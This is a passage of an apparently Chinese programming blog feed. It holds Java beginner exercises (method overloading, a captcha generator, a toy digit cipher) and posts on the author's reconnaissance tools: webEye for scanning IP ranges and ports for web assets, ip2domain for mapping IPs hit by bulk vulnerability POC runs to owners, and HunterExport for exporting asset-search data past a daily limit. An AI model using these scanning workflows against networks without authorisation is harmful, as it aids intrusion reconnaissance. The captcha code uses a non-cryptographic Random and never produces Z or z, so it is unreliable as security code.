class="headerlink" title="3、方法重载"></a>3、方法重载</h3><p>定义：同一类中，出现多个方法名称相同，但是参数列表不同，这些方法就是重载方法</p><p>重载方法可相互调用，代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法重载：</span></span><br><span class="line"><span class="comment">// 同一类中，出现多个方法名称相同，但是参数列表不同，这些方法就是重载方法</span></span><br><span class="line"><span class="comment">// 形参列表不同：形参的个数、顺序、类型不同，不关心形参名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Method</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        fire();</span><br><span class="line">        fire(<span class="string">&quot;岛国&quot;</span>);</span><br><span class="line">        fire(<span class="string">&quot;美利坚&quot;</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fire</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;默认发射1枚武器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fire</span><span class="params">(String location)</span></span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;向&quot; + location + &quot;发射1枚武器&quot;);</span></span><br><span class="line">        fire(<span class="string">&quot;岛国&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fire</span><span class="params">(String location, <span class="keyword">int</span> count)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;向&quot;</span> + location + <span class="string">&quot;发射&quot;</span> + count + <span class="string">&quot;枚武器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数列表不同：形参的个数、顺序、类型不同，不关心形参名称。</p><p>重载方法判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">()</span> </span>&#123;&#125; <span class="comment">//新方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;&#125; <span class="comment">//重载方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">double</span> b)</span> </span>&#123;&#125; <span class="comment">//重载方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">double</span> b, <span class="keyword">int</span> a)</span> </span>&#123;&#125; <span class="comment">//重载方法</span></span><br><span class="line"><span class="comment">// public static void find(int b, double a) &#123;&#125; //报错，已存在</span></span><br></pre></td></tr></table></figure><h2 id="三、代码编写"><a href="#三、代码编写" class="headerlink" title="三、代码编写"></a>三、代码编写</h2><h3 id="1、生成验证码"><a href="#1、生成验证码" class="headerlink" title="1、生成验证码"></a>1、生成验证码</h3><p>CreateCode.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sma11new.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成验证码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreateCode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;验证码位数：&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> length = scanner.nextInt();</span><br><span class="line">            String code = createCode(length);</span><br><span class="line">            System.out.println(<span class="string">&quot;生成的验证码：&quot;</span> + code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">createCode</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        String code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="comment">// 大写字母、小写字母、数字（0 1 2）</span></span><br><span class="line">            <span class="keyword">int</span> typeCode = random.nextInt(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">if</span> (typeCode == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 大写字母(A:65  Z:65+25) 即 (0, 25) + 65</span></span><br><span class="line">                code += (<span class="keyword">char</span>) (random.nextInt(<span class="number">25</span>) + <span class="number">65</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (typeCode == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">// 小写字母(a:97  z:97+25) 即 (0, 25) + 97</span></span><br><span class="line">                code += (<span class="keyword">char</span>) (random.nextInt(<span class="number">25</span>) + <span class="number">97</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (typeCode == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="comment">// 数字(0 9)</span></span><br><span class="line">                code += (random.nextInt(<span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055677.png" alt="image-20211024183444652"></p><p>相关知识点：</p><ol><li> Random类和Scanner类的使用</li></ol><h3 id="2、数字加解密"><a href="#2、数字加解密" class="headerlink" title="2、数字加解密"></a>2、数字加解密</h3><p>要求：一串数字，每位加5，取余10，再将结果反转，得到密文，并还原出明文</p><p>Encrypt.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sma11new.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Sma11New</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Github</span> https://github.com/Sma11New</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字加解密练习</span></span><br><span class="line"><span class="comment">/*一串数字，每位加5，取余10，再将结果反转，得到密文*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.printf(<span class="string">&quot;输入明文数字序列：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> msg = scanner.nextInt();</span><br><span class="line">        String encryptResult = encrypt(intToString(msg));</span><br><span class="line">        System.out.println(<span class="string">&quot;加密结果：&quot;</span> + encryptResult);</span><br><span class="line">        <span class="keyword">int</span> decryptResult = stringToInt(decrypt(encryptResult));</span><br><span class="line">        System.out.println(<span class="string">&quot;解密结果：&quot;</span> + decryptResult);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//加密</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        String encryptResult = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span>[] msgArray = msg.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line"><span class="comment">//            int msgArrayI = msgArray[i] - &#x27;0&#x27;; //char转int</span></span><br><span class="line">            <span class="keyword">int</span> msgArrayI = Character.getNumericValue(msgArray[i]); <span class="comment">//char转int</span></span><br><span class="line">            <span class="keyword">int</span> operationResult = (msgArrayI + <span class="number">5</span>) % <span class="number">10</span>;</span><br><span class="line">            msgArray[i] = (<span class="keyword">char</span>)(operationResult + <span class="number">48</span>); <span class="comment">// int数字转char</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line">            encryptResult += msgArray[msgArray.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encryptResult;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//解密</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        String decryptResult = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span>[] msgArray = msg.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line">            <span class="comment">/*if (Character.getNumericValue(msgArray[i]) &gt;= 5)&#123;</span></span><br><span class="line"><span class="comment">                msgArray[i] = (char)(Character.getNumericValue(msgArray[i]) - 5 + 48);</span></span><br><span class="line"><span class="comment">            &#125;else &#123;</span></span><br><span class="line"><span class="comment">                msgArray[i] = (char)(Character.getNumericValue(msgArray[i]) + 5 + 48);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">            <span class="comment">// 三目运算符，效果同上注释</span></span><br><span class="line">            msgArray[i] = (Character.getNumericValue(msgArray[i]) &gt;= <span class="number">5</span>) ?</span><br><span class="line">            ((<span class="keyword">char</span>)(Character.getNumericValue(msgArray[i]) - <span class="number">5</span> + <span class="number">48</span>)) :</span><br><span class="line">            ((<span class="keyword">char</span>)(Character.getNumericValue(msgArray[i]) + <span class="number">5</span> + <span class="number">48</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; msgArray.length; i++) &#123;</span><br><span class="line">            decryptResult += msgArray[msgArray.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decryptResult;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//int转换为String</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">intToString</span><span class="params">(<span class="keyword">int</span> msg)</span></span>&#123;</span><br><span class="line">        String result = <span class="string">&quot;&quot;</span> + msg;</span><br><span class="line">        <span class="comment">// String result = Integer.toString(msg);</span></span><br><span class="line">        <span class="comment">// String result = String.valueOf(msg);</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//String转换为int</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">stringToInt</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = Integer.parseInt(msg);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110250055915.png" alt="image-20211025002726563"></p><p>相关知识点：</p><ol><li> char和int的相互转换</li><li> String类型转换为数组</li><li> 三目运算符要在最前边写接收变量：<code>n = (a &gt; b) ? a : b;</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习之路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具篇】webEye - web资产探测工具</title>
      <link href="post/202110102133.html"/>
      <url>post/202110102133.html</url>
      
        <content type="html"><![CDATA[<p><strong>webEye工具专项于ip对应web资产探测，可用于红队信息搜集、蓝队内网web资产探测梳理。</strong></p><h2 id="🎁更新日志"><a href="#🎁更新日志" class="headerlink" title="🎁更新日志"></a>🎁更新日志</h2><h4 id="2021-10-10-v2-1-："><a href="#2021-10-10-v2-1-：" class="headerlink" title="2021-10-10 (v2.1)："></a><strong>2021-10-10 <code>(v2.1)</code>：</strong></h4><ul><li>  因效果不佳，删除ICP备案查询功能</li><li>  优化数据输入输出，加入解析多种ip和port格式，增加支持-p/–ip参数直接输入目标ip/ip段</li><li>  修改写入文件方式为分段式，减少资源占用</li><li>  加入任务进度显示，更加直观</li><li>  修复已知问题</li></ul><h4 id="2021-08-08-v2-0-："><a href="#2021-08-08-v2-0-：" class="headerlink" title="2021-08-08 (v2.0)："></a><strong>2021-08-08 <code>(v2.0)</code>：</strong></h4><ul><li>  修改项目名为webEye</li><li>  加入ICP备案查询</li></ul><h4 id="2021-02-13-v1-0-："><a href="#2021-02-13-v1-0-：" class="headerlink" title="2021-02-13 (v1.0)："></a><strong>2021-02-13 <code>(v1.0)</code>：</strong></h4><ul><li>  创建项目GetWebSiteTitle</li><li>  可读取文件ip列表进行简单的web资产探测</li></ul><h2 id="🏓功能简述"><a href="#🏓功能简述" class="headerlink" title="🏓功能简述"></a>🏓功能简述</h2><p><strong>webEye工具专项于ip对应web资产探测，可用于红队信息搜集、蓝队内网web资产探测梳理，目前功能及要点：</strong></p><ol><li> 批量IP的多个端口上Web<strong>存活检测</strong></li><li> 获取存活web<strong>站点标题</strong></li><li> 获取指定多个响应码的web资产</li><li> 使用<strong>线程池</strong>增加请求速度</li><li> 查询结果输出至<strong>Excel表格</strong></li></ol><p><strong>开发环境</strong>：Python 3.7、Win10</p><h2 id="🍉安装-amp-amp-说明"><a href="#🍉安装-amp-amp-说明" class="headerlink" title="🍉安装&amp;&amp;说明"></a>🍉安装&amp;&amp;说明</h2><h4 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h4><p>下载项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Sma11New&#x2F;webEye.git</span><br></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><p>webEye有以下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webEye.py [-h] [-i IP] [-f FILE] [-p PORT] [-t THREAD] [-T TIMEOUT] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help                     show this help message and exit</span><br><span class="line">  -i IP, --ip IP                 Target ip, eg:127.0.0.1&#x2F;24  【目标ip】</span><br><span class="line">  -f FILE, --file FILE           Target ip list file   【ip列表文件】</span><br><span class="line">  -p PORT, --port PORT           request port (default 80,81,88,443,4430,8080,8081,8181,8443,9000) 【目标端口】</span><br><span class="line">  -t THREAD, --thread THREAD     Number of thread (default 512) 【线程，默认512】</span><br><span class="line">  -T TIMEOUT, --Timeout TIMEOUT  Request timeout (default 3) 【请求超时，默认3】</span><br><span class="line">  -o OUTPUT, --output OUTPUT     Output file (default .&#x2F;output&#x2F;webEye_title_&#123;date&#125;.csv)</span><br></pre></td></tr></table></figure><p><strong>webEye支持的ip、port参数格式：</strong></p><p>-i/–ip 参数支持的格式：</p><ul><li>  192.168.1.1/24</li><li>  192.168.1.1-20</li><li>  192.168.1.*</li><li>  192.168.1-6.*</li></ul><p>-p/–port 参数支持的格式：</p><ul><li>  80,443,8080</li><li>  1-8080</li></ul><p>可使用”,”隔开一次指定多个，如：<code>-i 192.168.1.1-20,192.168.1-5.*,10.0.0.1/24</code></p><h2 id="🍭使用示例"><a href="#🍭使用示例" class="headerlink" title="🍭使用示例"></a>🍭使用示例</h2><p>可在命令行中用-i/–ip指定目标ip，支持多种格式和多个参数，使用英文逗号隔开，-p/–port同理</p><p>也可将目标ip信息写入文件，一行一个目标ip，支持多种格式，可直接将带协议、端口的地址写入，省去师傅们删掉协议、端口的操作，弟弟在程序里写好了。如（127.0.0.1 或 127.0.0.1:8080 或 <a href="http://127.0.0.1:8080），ip文件实例：">http://127.0.0.1:8080），ip文件实例：</a></p><p>ipList.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1&#x2F;24</span><br><span class="line">192.168.2.1-200</span><br><span class="line">192.168.1-5.*</span><br></pre></td></tr></table></figure><p>参数示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 webEye.py -i 192.168.1.1&#x2F;16</span><br><span class="line">python3 webEye.py -i 192.168.1.1-20,192.168.1-5.* -p 80,8080,100-999</span><br><span class="line">python3 webEye.py -f ipList.txt -p 1-65535</span><br></pre></td></tr></table></figure><p>探测演示：</p><p>指定目标ip文件进行web资产探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\webEye.py -f E:\Desktop\ip.txt -p 80,8080,443,9090</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-10-10_14-38-36.png" alt="image_2021-10-10_14-38-36"></p><p>程序没什么结构性，不过能跑起来、能用的就是好程序，欢迎师傅们使用。</p><h2 id="⭐项目地址"><a href="#⭐项目地址" class="headerlink" title="⭐项目地址"></a>⭐项目地址</h2><p><strong>Github：<a href="https://github.com/Sma11New/webEye">https://github.com/Sma11New/webEye</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web资产探测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具篇】ip2domain - 批量ip反查域名及备案信息工具</title>
      <link href="post/202109202133.html"/>
      <url>post/202109202133.html</url>
      
        <content type="html"><![CDATA[<h3 id="🎯简述"><a href="#🎯简述" class="headerlink" title="🎯简述"></a>🎯简述</h3><p>ip2domain是一款自写的批量ip反查域名及备案信息工具，在批量挖SRC时，通常会用较新的漏洞POC批量跑fofa或其他空间测绘的相关资产ip，该工具可用于对跑到的ip批量<strong>反查域名</strong>及<strong>备案信息</strong>，快速确定ip所属企业，方便提交漏洞。</p><h3 id="📢说明"><a href="#📢说明" class="headerlink" title="📢说明"></a>📢说明</h3><p>该工具是在之前的webEye上改进而来，由于webEye是检测IP端口站点存活后在页面匹配ICP号查询备案信息，准确率较低，因此改进为调用接口查询。</p><p><strong>功能特点如下：</strong></p><ol><li> 快速批量查询备案信息；</li><li> 结果导出至Excel表格；</li><li> 使用多线程加快速度；</li></ol><p>代码中对域名做提取主域和已查询标记，同一域名仅查询并输出一次。</p><p><strong>注意：</strong></p><p>当<strong>反查域名</strong>列出现”– Connect Failed –”时表示<strong>反查域名</strong>接口请求出错</p><p>当<strong>单位名称</strong>列出现”– Connect Failed –”时表示<strong>备案信息</strong>接口请求出错</p><p>出现以上问题极有可能是请求频率过高，但由于是调用api而不是模拟浏览器请求，因此出现的概率极小。</p><h3 id="🚩使用"><a href="#🚩使用" class="headerlink" title="🚩使用"></a>🚩使用</h3><p>安装依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usage: ip2domain.py [-h] -f  [-t] [-T] [-o]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help      show this help message and exit</span><br><span class="line">  -f, --file      Target IP file</span><br><span class="line">  -t, --thread    Number of thread (default 32)</span><br><span class="line">  -T, --Timeout   request timeout (default 3)</span><br><span class="line">  -o, --output    output file (default .&#x2F;output&#x2F;&#123;fileName&#125;_title_&#123;date&#125;.csv)</span><br></pre></td></tr></table></figure><p>将要查询的ip放在txt文件内一行一个，以下几种格式均可：</p><ul><li>  单纯ip：127.0.0.1</li><li>  带端口：127.0.0.1:8080</li><li>  带http、https协议：<a href="https://127.0.0.1/">https://127.0.0.1</a></li><li>  带协议及端口：<a href="https://127.0.0.1:8080/">https://127.0.0.1:8080</a></li></ul><p>可处理多种格式数据，适应各种工具的导出结果。</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20210920091939132.png" alt="image-20210920091939132"></p><p><code>python ip2domain.py -f [file]</code> 指定文件即可，其余参数为可选：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-18_16-41-34.png" alt="image_2021-09-18_16-41-34"></p><p>400多ip用时8秒，当前线程32，结果文件：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-18_16-39-54.png" alt="image_2021-09-18_16-39-54"></p><h3 id="🎈地址"><a href="#🎈地址" class="headerlink" title="🎈地址"></a>🎈地址</h3><p>Github地址：<a href="https://github.com/Sma11New/ip2domain">https://github.com/Sma11New/ip2domain</a></p><p><strong>欢迎使用，我愿称之为最强</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ip反查域名 </tag>
            
            <tag> ip查备案信息 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具篇】HunterExport - QAX全球鹰数据批量查询导出工具</title>
      <link href="post/202109162133.html"/>
      <url>post/202109162133.html</url>
      
        <content type="html"><![CDATA[<h3 id="📞简述"><a href="#📞简述" class="headerlink" title="📞简述"></a>📞简述</h3><p>由于全球鹰Hunter目前仅支持每天导出1000条数据，因此写了该工具调用查询API，可无限制导出查询结果至Excel表格。</p><p>目前全球鹰仅对公司内部开放，因此全程需要<strong>接入公司内网</strong>。接入内网后，登录安服武器库全球鹰Hunter获取用户名（邮箱）和密钥（Key），写入default.conf配置文件，运行 HunterEcport.py 输入查询指令即可获取数据，并输出至文件。</p><h3 id="✨更新"><a href="#✨更新" class="headerlink" title="✨更新"></a>✨更新</h3><p><strong>当前版本为第二版，更新情况如下：</strong></p><ol><li> 修复全球鹰加入请求编码后第一版无法使用问题</li><li> 支持文件批量查询</li><li> 加入日志系统</li><li> 增加配置文件项，解决请求出错问题</li><li> 修复bug，优化程序，完善功能</li></ol><h3 id="🪓配置文件"><a href="#🪓配置文件" class="headerlink" title="🪓配置文件"></a>🪓配置文件</h3><ul><li>  mail = <a href="mailto:&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#64;&#x71;&#105;&#97;&#x6e;&#x78;&#105;&#110;&#x2e;&#99;&#111;&#x6d;">&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#64;&#x71;&#105;&#97;&#x6e;&#x78;&#105;&#110;&#x2e;&#99;&#111;&#x6d;</a>  - 邮箱</li><li>  key = abcdefgh12345678987654321hgfedcba - key</li><li>  countMax  - 导出数量封顶限制，越大越慢，适量增减，单位：条</li><li>  searchMonth  - 查询时间范围，12、24恰当，越长越容易出现死资产，单位：月</li><li>  timeSleep - 请求时延，越小越快，越容易请求错误，0.5s、1s恰当，适量增减，单位：秒</li><li>  isWeb - 是否仅查询web资产，1是2否</li></ul><p>按需修改即可。</p><h3 id="🚩使用"><a href="#🚩使用" class="headerlink" title="🚩使用"></a>🚩使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage: python3 HunterExport.py</span><br><span class="line">    Command&gt; app&#x3D;&quot;***&quot;      (单次查询)</span><br><span class="line">    Command&gt; file filePath  (批量查询)</span><br><span class="line">    Command&gt; hlep           (语法查询)    </span><br></pre></td></tr></table></figure><p>单个查询  <code>app=&quot;***&quot;</code>  （当前timeSleep为0，会出现请求频率太高）：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-16_14-00-35.png" alt="image_2021-09-16_14-00-35"></p><p>文件批量查询  <code>file filePath</code> （修改配置问价timeSleep为0.5，请求出错问题解决）：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-16_14-09-08.png" alt="image_2021-09-16_14-09-08"></p><p>查询结果及debug.log日志文件：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20210916143427590.png" alt="image-20210916143427590"></p><p>其中日志记录有三个关键字：</p><ol><li> SCMD：search command，记录查询过的命令</li><li> INFO：information，记录程序运行中产生的信息</li><li> 